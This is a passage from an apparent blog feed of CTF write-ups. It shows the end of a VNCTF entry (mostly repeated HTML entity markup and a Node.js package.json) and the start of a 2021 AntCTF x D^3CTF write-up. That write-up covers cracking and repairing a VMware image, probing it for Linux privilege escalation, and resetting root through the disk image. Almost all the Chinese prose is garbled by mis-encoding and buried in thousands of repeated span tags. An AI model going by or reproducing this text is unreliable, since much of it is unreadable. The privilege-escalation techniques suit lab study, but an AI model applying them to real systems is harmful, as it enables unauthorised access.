title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>æ­¤è‡´<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>æ•¬ç¤¼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> 2021/2/6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span> <span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h3><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.1"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Description"</span><span class="token punctuation">,</span>  <span class="token property">"private"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"src/index.js"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"module"</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"node src/index.js"</span><span class="token punctuation">,</span>    <span class="token property">"build:native"</span><span class="token operator">:</span> <span class="token string">"node-gyp rebuild"</span><span class="token punctuation">,</span>    <span class="token property">"build:native:dev"</span><span class="token operator">:</span> <span class="token string">"node-gyp rebuild --debug"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"bindings"</span><span class="token operator">:</span> <span class="token string">"^1.5.0"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"expression-eval"</span><span class="token operator">:</span> <span class="token string">"^4.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"node-addon-api"</span><span class="token operator">:</span> <span class="token string">"^3.0.2"</span><span class="token punctuation">,</span>    <span class="token property">"seval"</span><span class="token operator">:</span> <span class="token string">"^2.0.1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"@types/express"</span><span class="token operator">:</span> <span class="token string">"^4.17.8"</span><span class="token punctuation">,</span>    <span class="token property">"@types/node"</span><span class="token operator">:</span> <span class="token string">"^14.10.1"</span><span class="token punctuation">,</span>    <span class="token property">"node-gyp"</span><span class="token operator">:</span> <span class="token string">"^7.1.2"</span><span class="token punctuation">,</span>    <span class="token property">"prettier"</span><span class="token operator">:</span> <span class="token string">"^2.0.5"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>bindings NodeJS æ¨¡å—é€†å‘</p><p><img src="CTF_2021VNCTF/image-20210315035538558.png"></p><p><img src="CTF_2021VNCTF/image-20210315035544814.png" alt="key"></p><pre class="language-none"><code class="language-none">hei, do you know reverse, webbeer</code></pre><p>â€“&gt;</p>-->]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 AntCTF x D^3CTF WriteUp</title>
      <link href="2021/03/09/CTF_2021Ant-D3CTF/"/>
      <url>2021/03/09/CTF_2021Ant-D3CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/banner.jpg"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p><strong>2021 AntCTF x D^3CTF</strong></p><blockquote><p>AntCTF x D^3CTF æ˜¯èš‚èšé›†å›¢å®‰å…¨å“åº”ä¸­å¿ƒï¼ˆAntSRCï¼‰æºæ‰‹ä¸‰æ”¯â€œç”µå­ç§‘å¤§â€é˜Ÿä¼ï¼š<strong>æ­ç”µ Vidar-Team</strong>ã€<strong>è¥¿ç”µ L-Team</strong> åŠ<strong>æˆç”µ CNSS</strong> å…±åŒä¸¾åŠçš„ CTF èµ›äº‹ï¼ˆæš¨ç¬¬åäºŒå±Š HCTFã€ç¬¬äº”å±Š LCTFï¼‰</p><p><strong>çº¿ä¸Šèµ›</strong> 3æœˆ5æ—¥ 20:00ï¼3æœˆ7æ—¥ 20:00</p><p>ä»‹ç»é¡µé¢ï¼š <a href="https://d3ctf.io/">https://d3ctf.io/</a></p><p>æ¯”èµ›å¹³å°ï¼š <a href="https://ant-d3ctf.alipay.com/">https://ant-d3ctf.alipay.com/</a></p></blockquote><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210312212948787.png"></p><p>å‰ä¸ä¹…çœ‹ç¾¤é‡Œå¸ˆå‚…æ¨äº†è¿™ä¸ªæ¯”èµ›ï¼Œå°±æ¥æ‰“æ‰“ç©ç©å¥½äº†ã€‚</p><p>æ¯”èµ›é¢˜ç›®æ”¾å‡ºæ¥æ‰å‘ç°è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„ï¼Œäºæ˜¯å–µå–µä¹Ÿä¸ä¼šåšï¼Œå¤§å“­å‘œå‘œå‘œã€‚</p><p>å’Œé˜Ÿé‡Œå¸ˆå‚…ä¸€èµ·æ‰“çš„ï¼Œè¿™é‡Œå°±ç®€å•å†™å†™æˆ‘åšçš„å§ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Virtual-Love"><a href="#Virtual-Love" class="headerlink" title="Virtual Love"></a>Virtual Love</h3><blockquote><p>You say you love me, but you donâ€™t know me at all! Your loveâ€¦Your love is all virtual!<strong>ï¼ˆLogin User: guestï¼‰<br>The second part of the attachmentï¼š</strong><br><a href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part2.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part2.rar</a><br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p><p><a href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part1.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part1.rar</a> </p></blockquote><p>å¥½å®¶ä¼™ï¼Œ6GiB çš„ Vmware è™šæ‹Ÿæœºé•œåƒï¼</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231110115.png"></p><p>è§£å‹å‡ºæ¥å¯¼å…¥ Vmwareï¼Œå‘ç°éœ€è¦å¯†ç ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231222153.png"></p><p>ç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§é¢˜å”‰ï¼Œäºæ˜¯æƒ³åˆ°çˆ†ç ´è¿™ä¸ªå¯†ç ã€‚</p><p>GitHub ä¸Šæ‰¾åˆ°äº† <strong><a href="https://github.com/axcheron/pyvmx-cracker">pyvmx-cracker</a></strong> è¿™ä¸ªå·¥å…·ï¼Œä½†æ˜¯è·‘äº† 10W+ çš„å­—å…¸éƒ½æ²¡è·‘å‡ºæ¥ï¼Œäºæ˜¯æ”¾å¼ƒã€‚</p><p>åˆæƒ³åˆ°èƒ½ä¸èƒ½ç›´æ¥å¯¼å…¥è™šæ‹Ÿæœºé•œåƒ vmdk å•Šï¼Œè¯•äº†è¯•è¿˜æ˜¯æŠ¥é”™äº†ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231436850.png"></p><p>å†å»çœ‹çœ‹ <code>VirtualLove-s00*.vmdk</code> æ–‡ä»¶ï¼Œæ‰¾ä¸ªæ­£å¸¸çš„æ¯”å¯¹äº†ä¸€ä¸‹ï¼Œå¥½å®¶ä¼™ï¼Œå»æ‰äº†æ–‡ä»¶å¤´å•Šï¼</p><p>æ”¹å¥½æ–‡ä»¶å¤´ï¼Œå†ä¸€çœ‹è¿˜æ˜¯ä¸å¯¹å•Šï¼ï¼ï¼</p><p>å†æ¯”å¯¹äº†äº¿ä¸‹ï¼Œæ€ä¹ˆè¿˜å»æ‰äº†æ–‡ä»¶å¤´éƒ¨å¦å¤–ä¸€æ®µâ€¦â€¦</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231737549.png"></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307012353570.png" alt="ä¿®æ”¹å"></p><p>å—¯ï¼Œåˆ°è¿™é‡Œè¿˜æ˜¯æŠ¥é”™ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232222852.png" alt="åå"></p><p>å†çœ‹ <code>VirtualLove.vmdk</code>ï¼Œå‘ç°æŠŠ <code>version</code> æ ‡è®°ç»™æ•´æ²¡äº†ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232343325.png"></p><p>åŠ ä¸Šï¼Œç»ˆäºèƒ½å¤Ÿæ­£å¸¸å¯åŠ¨äº†ã€‚</p><p><code>guest</code> ç”¨æˆ·ç™»å½•ã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232448738.png"></p><p>åè€¶ï¼æœ‰å‡çš„ flagï¼</p><p>æç¤ºéœ€è¦è¿›å…¥ rootï¼Œäºæ˜¯è¯•ç€ææƒã€‚</p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232527801.png" alt="ç³»ç»Ÿä¿¡æ¯"></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232541721.png" alt="sudo"></p><p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232652077.png" alt="suid"></p><p>åè€¶ï¼éƒ½æœ€æ–°ç‰ˆæœ¬äº†ï¼çœ‹ä¸Šå» setuid ææƒä¹Ÿä¸å¤§è¡Œã€‚<code>/etc/passwd</code> ä¹Ÿä¸å¯å†™ã€‚è®¡åˆ’ä»»åŠ¡ä¹Ÿä¸è¡Œã€‚</p><p>ï¼ˆæŸ¥äº†åŠå¤©æ€ä¹ˆææƒï¼Œæˆ‘å¥½èœå•Šå–µå‘œå‘œ</p><blockquote><p><a href="https://www.cnblogs.com/pzzning/p/6220977.html">Centosæ™®é€šç”¨æˆ·ææƒè‡³ROOT</a> <strong>åˆ©ç”¨ <code>/bin/ping</code> rws ä¸­çš„ s çš„æ¼æ´</strong></p><p><a href="https://www.freebuf.com/articles/system/129549.html">Linuxææƒï¼šä»å…¥é—¨åˆ°æ”¾å¼ƒ</a></p><p><a href="https://xz.aliyun.com/t/7924">å¯¹Linux ææƒçš„ç®€å•æ€»ç»“</a></p><p><a href="https://www.anquanke.com/post/id/86979">ã€å®‰å…¨ç§‘æ™®ã€‘Linuxææƒâ€”â€”åˆ©ç”¨å¯æ‰§è¡Œæ–‡ä»¶SUID</a></p><p>etc.</p></blockquote><p>å‘ç°è²Œä¼¼ä¸€ä¸ªéƒ½æä¸äº†æƒã€‚</p><p>å†åæ¥ï¼Œæƒ³åˆ°æˆ‘æœ‰é•œåƒå•Šï¼Œä½•å¿…å‘¢ï¼æˆ‘å¯ä»¥æ”¹ root ç”¨æˆ·çš„å¯†ç å•Šã€‚</p><p>GitHub ä¸Šæ‰¾åˆ°äº†ä¸ª <strong><a href="https://github.com/xuriwuyun/change-root-passwd">change-root-passwd</a></strong></p><blockquote><p>å¯ä»¥å‚è€ƒ <a href="https://blog.csdn.net/xuriwuyun/article/details/41283077">ä¿®æ”¹è™šæ‹Ÿæœºé•œåƒçš„rootå¯†ç </a> è¿™ç¯‡æ¥å®ç°ã€‚</p></blockquote><p>å†è¿›ä¸€æ­¥ï¼Œæˆ‘éƒ½æœ‰é•œåƒäº†ï¼Œå•¥éƒ½èƒ½æå–çš„å•Šï¼å•Šæˆ‘æ˜¯åºŸç‰©å‘œå‘œå‘œã€‚</p><p>äºæ˜¯åˆæ‰¾åˆ°äº† <strong>Libguestfs</strong>ï¼Œ<strong>ä¸€ä¸ªç”¨æ¥è®¿é—®å’Œä¿®æ”¹è™šæ‹Ÿæœºç£ç›˜é•œåƒçš„ä¸€ä¸ªå·¥å…·é›†</strong></p><blockquote><p><a href="https://www.jianshu.com/p/c154f43b7fac">è™šæ‹Ÿæœºé•œåƒç®¡ç†å·¥å…·â€“ Libguestfs</a></p><p><a href="https://blog.csdn.net/wenwenxiong/article/details/52223731">CentOS7.1 KVMè™šæ‹ŸåŒ–ä¹‹libguestfs-toolså·¥å…·å¸¸ç”¨å‘½ä»¤ä»‹ç»</a></p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span 